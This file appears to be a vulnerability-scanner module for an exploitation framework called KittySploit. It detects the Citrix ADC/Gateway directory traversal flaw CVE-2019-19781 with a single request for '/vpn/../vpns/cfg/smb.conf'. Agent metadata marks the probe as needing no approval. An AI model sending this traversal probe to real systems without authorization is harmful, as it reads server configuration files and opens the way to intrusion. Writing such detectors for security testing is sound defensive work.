#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix Application Delivery Controller (ADC) and Gateway 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix ADC and Gateway - Directory Traversal Detection',
        'description': 'Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are susceptible to directory traversal vulnerabilities.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'kev', 'packetstorm', 'citrix', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX267027',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-19781',
            'https://www.kb.cert.org/vuls/id/619785',
            'http://packetstormsecurity.com/files/155904/Citrix-Application-Delivery-Controller-Gateway-Remote-Code-Execution.html',
            'http://packetstormsecurity.com/files/155905/Citrix-Application-Delivery-Controller-Gateway-Remote-Code-Execution-Traversal.html',
        ],
        'cve': 'CVE-2019-19781',
    }

    def run(self):
        r = self.http_request(method="GET", path='/vpn/../vpns/cfg/smb.conf', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('[global]',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Citrix ADC and Gateway - Directory Traversal detected",
                path='/vpn/../vpns/cfg/smb.conf',
            )
            return True
        return False

